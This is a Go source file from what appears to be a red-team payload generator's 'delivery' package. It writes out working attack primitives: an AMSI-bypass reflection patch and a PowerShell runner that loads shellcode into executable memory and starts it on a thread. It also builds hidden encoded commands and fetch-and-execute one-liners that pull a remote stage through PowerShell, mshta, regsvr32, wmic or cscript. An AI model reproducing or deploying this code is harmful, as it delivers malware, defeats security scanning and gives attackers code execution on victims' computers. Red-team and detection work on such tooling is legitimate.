// stagers.go holds the shared delivery primitives every emitter composes:
//
//   - ps1StagerBody / ps1StagerOneLine — the inline PowerShell shellcode runner
//     (AMSI-bypass prologue + base64-decode + VirtualAlloc/Copy/CreateThread/
//     WaitForSingleObject). Used directly by -f ps1 and as the embedded payload
//     of every launcher wrapper (lnk/hta/sct/vba/xsl/js/jse) in inline mode.
//   - ps1Enc — UTF-16LE base64 of the one-liner, ready for `powershell -enc`.
//   - ps1Fetch / ps1FetchEnc — remote stage-2 fetch one-liner (IEX + Download).
//   - lolbinRemote — maps a launcher name to its LOLBin command line for --url.
//   - b64Std — standard base64 for embedding shellcode in script bodies.
//
// These are dual-use red-team primitives. The package never executes them.
package delivery

import (
	"encoding/base64"
	"fmt"
	"strings"
	"unicode/utf16"
)

// b64Std returns standard base64 (no newline wrapping) of data.
func b64Std(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

// utf16LE encodes an ASCII/latin1 string as UTF-16 little-endian bytes. PowerShell
// `-enc` expects base64 of UTF-16LE command text. We keep input ASCII (our PS
// one-liners are), so each rune maps to one 16-bit code unit.
func utf16LE(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for _, r := range s {
		if r < 0x10000 {
			u := utf16.Encode([]rune{r})[0]
			out = append(out, byte(u), byte(u>>8))
		} else {
			// surrogate pair (won't happen for ASCII control text); emitReplacement.
			out = append(out, 0xFD, 0xFF)
		}
	}
	return out
}

// ps1Enc base64-encodes a PowerShell one-liner as UTF-16LE, the format
// `powershell -EncodedCommand` expects.
func ps1Enc(text string) string {
	return b64Std(utf16LE(text))
}

// amusiBypass is the AMSI init-fail reflection patch prologue. Wrapped in
// try/catch so a non-applicable host (PS Core without AMSI, older PS) is a no-op
// rather than an error. Runs before any Add-Type compile.
const amsiBypass = `try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}`

// pinvokeSrc is the Add-Type member definition for the Win32 calls the stager
// needs. Pointer-width via IntPtr so it works in 64-bit PowerShell.
const pinvokeSrc = `[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);` +
	`[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);` +
	`[DllImport("kernel32")]public static extern IntPtr CreateThread(uint a,uint s,IntPtr p,IntPtr c,uint f,ref uint i);`

// ps1StagerBody returns a multi-line PowerShell script that decodes the embedded
// base64 shellcode, VirtualAllocs RWX memory, copies the bytes, and runs them on
// a new thread. Used verbatim as the -f ps1 artifact body.
func ps1StagerBody(sc []byte) string {
	return amsiBypass + "\n" +
		"$b=[Convert]::FromBase64String('" + b64Std(sc) + "')\n" +
		"$a=Add-Type -MemberDefinition '" + pinvokeSrc + "' -Name W -Namespace K -PassThru\n" +
		"$p=$a::VirtualAlloc(0,$b.Length,0x3000,0x40)\n" +
		"[Marshal]::Copy($b,0,$p,$b.Length)\n" +
		"$i=0;$h=$a::CreateThread(0,0,$p,0,0,[ref]$i)\n" +
		"$a::WaitForSingleObject($h,0xFFFFFFFF)|Out-Null\n"
}

// ps1StagerOneLine is the same stager collapsed to a single line (semicolons),
// for embedding as an argument to a launcher (powershell -c, Shell, Run, etc.).
func ps1StagerOneLine(sc []byte) string {
	return amsiBypass + ";" +
		"$b=[Convert]::FromBase64String('" + b64Std(sc) + "');" +
		"$a=Add-Type -MemberDefinition '" + pinvokeSrc + "' -Name W -Namespace K -PassThru;" +
		"$p=$a::VirtualAlloc(0,$b.Length,0x3000,0x40);" +
		"[Marshal]::Copy($b,0,$p,$b.Length);" +
		"$i=0;$h=$a::CreateThread(0,0,$p,0,0,[ref]$i);" +
		"$a::WaitForSingleObject($h,0xFFFFFFFF)|Out-Null"
}

// ps1InlineEnc returns UTF-16LE base64 of the one-line stager, ready to pass to
// `powershell -w hidden -EncodedCommand <...>`. Every launcher wrapper uses this
// in inline mode.
func ps1InlineEnc(sc []byte) string {
	return ps1Enc(ps1StagerOneLine(sc))
}

// ps1Fetch returns a remote stage-2 fetch one-liner: download a PowerShell stage
// from url and execute it inline. Used as the -f ps1 body in remote mode and as
// the embedded command of launcher wrappers in remote mode (via ps1FetchEnc).
func ps1Fetch(url string) string {
	return "IEX (New-Object Net.WebClient).DownloadString('" + url + "')"
}

// ps1FetchEnc is the UTF-16LE base64 of ps1Fetch, for `powershell -enc`.
func ps1FetchEnc(url string) string {
	return ps1Enc(ps1Fetch(url))
}

// lolbinRemote maps a launcher name to a full command line that fetches+executes
// a stage-2 at url. Used by launcher wrappers (lnk/hta/sct/xsl/js/vba) in
// --url mode. Default/empty launcher -> powershell.
func lolbinRemote(launcher, url string) string {
	launcher = strings.ToLower(strings.TrimSpace(launcher))
	if launcher == "" {
		launcher = "powershell"
	}
	switch launcher {
	case "powershell":
		return "powershell -w hidden -EncodedCommand " + ps1FetchEnc(url)
	case "cmd":
		return `cmd /c powershell -w hidden -EncodedCommand ` + ps1FetchEnc(url)
	case "mshta":
		return "mshta " + url
	case "regsvr32":
		return "regsvr32 /s /u /i:" + url + " scrobj.dll"
	case "wmic":
		return `wmic os get /format:"` + url + `"`
	case "cscript":
		return "cscript //nologo " + url
	default:
		// Unknown launcher falls back to a powershell fetch so emission never
		// silently produces a no-op command.
		return "powershell -w hidden -EncodedCommand " + ps1FetchEnc(url)
	}
}

// launcherInlineCmd returns the command line a launcher wrapper should execute in
// INLINE mode (shellcode embedded). It is `powershell -w hidden -enc <stager>`.
// Launcher wrappers that aren't powershell-native (mshta/regsvr32/wmic/cscript)
// don't have an inline mode that embeds shellcode — they wrap a powershell -enc
// stager, since that's the universal inline primitive. This function centralizes
// that decision so emitters stay thin.
func launcherInlineCmd(sc []byte) string {
	return "powershell -w hidden -EncodedCommand " + ps1InlineEnc(sc)
}

// resolveLauncher normalizes the launcher flag, defaulting to powershell.
func resolveLauncher(l string) string {
	l = strings.ToLower(strings.TrimSpace(l))
	if l == "" {
		return "powershell"
	}
	return l
}

// validLauncher reports whether l is a known launcher name.
func validLauncher(l string) bool {
	switch resolveLauncher(l) {
	case "powershell", "cmd", "mshta", "regsvr32", "wmic", "cscript":
		return true
	}
	return false
}

// errPayloadRequired is the standard inline-mode "no shellcode" error.
func errPayloadRequired(format string) error {
	return fmt.Errorf("delivery: -f %s needs shellcode in inline mode (supply -s <file> or --c2 <backend>), or use --url for remote mode", format)
}